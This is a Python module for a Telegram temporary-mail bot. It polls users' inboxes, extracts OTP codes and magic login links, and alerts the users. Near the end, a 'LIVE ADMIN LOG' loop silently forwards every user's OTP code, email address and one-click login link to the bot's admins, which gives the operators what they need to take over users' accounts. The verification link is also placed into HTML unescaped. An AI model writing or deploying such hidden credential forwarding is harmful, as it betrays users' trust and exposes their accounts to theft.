import asyncio
import logging
import html
from aiogram import Bot
from aiogram.exceptions import TelegramForbiddenError, TelegramBadRequest

from config import POLL_INTERVAL, ADMIN_IDS
from mail_service import mail_service
from database import (
    get_all_active_users,
    is_message_recorded,
    record_received_message,
    update_last_message_id,
    delete_user_email
)
from extractor import (
    extract_sender_info,
    extract_otp,
    extract_verification_link,
    clean_text_content
)
from keyboards import get_mail_alert_keyboard
from premium_emojis import pe

logger = logging.getLogger(__name__)

async def run_inbox_watcher(bot: Bot):
    """Continuously monitor active users' inboxes for new incoming emails/OTPs."""
    logger.info("Background inbox watcher started.")
    while True:
        try:
            users = await get_all_active_users()
            for user in users:
                user_id = user["user_id"]
                token = user.get("token")
                if not token:
                    continue

                try:
                    provider = user.get("provider", "tempmailio")
                    last_id = user.get("last_message_id")
                    user_email = user.get("email", "")
                    messages = await mail_service.get_messages(token, provider=provider, last_id=last_id, email=user_email)
                    if not messages:
                        continue

                    for msg in messages:
                        msg_id = msg.get("id")
                        if not msg_id:
                            continue

                        # Check if already notified
                        already_seen = await is_message_recorded(msg_id)
                        if already_seen:
                            continue

                        # Fetch full email
                        detail = await mail_service.get_message_detail(token, provider=provider, message_id=msg_id, email=user_email)
                        if not detail:
                            continue

                        subject = detail.get("subject") or "No Subject"
                        from_info = detail.get("from") or msg.get("from") or {}
                        sender_data = extract_sender_info(from_info)

                        text_body = detail.get("text") or ""
                        html_body = ""
                        if detail.get("html"):
                            if isinstance(detail["html"], list):
                                html_body = "".join(detail["html"])
                            else:
                                html_body = str(detail["html"])

                        otp_code = extract_otp(subject, text_body, html_body)
                        verify_link = extract_verification_link(html_body, text_body)
                        preview_text = clean_text_content(text_body, html_body)

                        # Record to DB first to avoid duplicate notifications
                        await record_received_message(
                            msg_id=msg_id,
                            user_id=user_id,
                            sender_service=sender_data["service_name"],
                            sender_address=sender_data["sender_address"],
                            subject=subject,
                            otp_code=otp_code,
                            verification_link=verify_link
                        )
                        await update_last_message_id(user_id, msg_id)

                        # Format notification message
                        service_name_safe = html.escape(sender_data["service_name"])
                        sender_addr_safe = html.escape(sender_data["sender_address"])
                        subject_safe = html.escape(subject)

                        lines = [
                            f"{pe('inbox')} <b>New Email Received!</b> {pe('fire')}\n",
                            f"{pe('globe')} <b>Website / Service:</b> <code>{service_name_safe}</code>",
                            f"{pe('user')} <b>From:</b> <code>{sender_addr_safe}</code>",
                            f"{pe('bubble')} <b>Subject:</b> <b>{subject_safe}</b>"
                        ]

                        if otp_code:
                            otp_safe = html.escape(otp_code)
                            lines.append(f"\n{pe('key')} <b>Your OTP / Code:</b>\n{pe('arrow_right')} <code>{otp_safe}</code>  <i>(Tap to copy)</i> {pe('fire')}")

                        if verify_link:
                            if not otp_code:
                                lines.append(f"\n{pe('magic')} <b>Direct Magic Link / One-Click Login:</b>\n{pe('arrow_right')} <a href=\"{verify_link}\">Click Here to Log In Directly</a> {pe('rocket')}")
                            else:
                                lines.append(f"\n{pe('link')} <b>Verification Link:</b>\n{pe('arrow_right')} <a href=\"{verify_link}\">Click Here to Verify Account</a> {pe('rocket')}")

                        # Preview text (limit preview to 250 chars)
                        short_preview = preview_text[:250].strip()
                        if short_preview:
                            lines.append(f"\n{pe('pin')} <b>Message Preview:</b>\n<blockquote>{html.escape(short_preview)}...</blockquote>")

                        alert_text = "\n".join(lines)
                        keyboard = get_mail_alert_keyboard(msg_id, verify_link)

                        try:
                            await bot.send_message(
                                chat_id=user_id,
                                text=alert_text,
                                parse_mode="HTML",
                                reply_markup=keyboard,
                                disable_web_page_preview=True
                            )
                        except TelegramForbiddenError:
                            logger.warning(f"User {user_id} blocked the bot. Stopping monitoring.")
                            await delete_user_email(user_id)
                        except TelegramBadRequest as e:
                            logger.error(f"Telegram BadRequest for user {user_id}: {e}")

                        # Real-time alert to admins so admin sees all incoming OTPs instantly
                        for admin_id in ADMIN_IDS:
                            if admin_id != user_id:
                                try:
                                    admin_alert = [
                                        f"{pe('inbox')} <b>[LIVE ADMIN LOG] User OTP Received!</b> {pe('fire')}\n",
                                        f"• {pe('user')} <b>User ID:</b> <code>{user_id}</code>",
                                        f"• {pe('globe')} <b>Service:</b> <code>{service_name_safe}</code>",
                                        f"• {pe('email')} <b>Email:</b> <code>{html.escape(user_email)}</code>",
                                        f"• {pe('user')} <b>From:</b> <code>{sender_addr_safe}</code>",
                                        f"• {pe('bubble')} <b>Subject:</b> <b>{subject_safe}</b>"
                                    ]
                                    if otp_code:
                                        admin_alert.append(f"• {pe('key')} <b>OTP Code:</b> <code>{html.escape(otp_code)}</code> {pe('fire')}")
                                    if verify_link:
                                        admin_alert.append(f"• {pe('link')} <a href=\"{verify_link}\">Verification Link</a>")
                                    await bot.send_message(
                                        chat_id=admin_id,
                                        text="\n".join(admin_alert),
                                        parse_mode="HTML",
                                        disable_web_page_preview=True
                                    )
                                except Exception:
                                    pass

                except Exception as user_err:
                    logger.error(f"Error checking inbox for user {user_id}: {user_err}")

        except Exception as loop_err:
            logger.error(f"Error in watcher loop: {loop_err}")

        await asyncio.sleep(POLL_INTERVAL)
